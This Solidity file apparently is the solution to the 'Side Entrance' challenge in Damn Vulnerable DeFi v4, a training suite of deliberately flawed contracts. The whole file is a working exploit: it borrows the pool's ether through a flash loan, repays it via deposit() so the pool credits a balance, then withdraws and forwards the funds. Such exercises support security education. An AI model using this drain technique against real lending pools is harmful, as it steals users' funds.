// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import { IFlashLoanEtherReceiver, SideEntranceLenderPool } from "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceSolution is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool public immutable pool;
    address public immutable recovery;

    constructor(SideEntranceLenderPool pool_, address recovery_) {
        pool = pool_;
        recovery = recovery_;
    }

    receive() external payable {}

    function execute() external override payable {
        pool.deposit{value: msg.value}();
    }

    function attack() public {
        pool.flashLoan(ETHER_IN_POOL);

        pool.withdraw();

        (bool success,) = recovery.call{value: ETHER_IN_POOL}("");

        require(success);
    }
}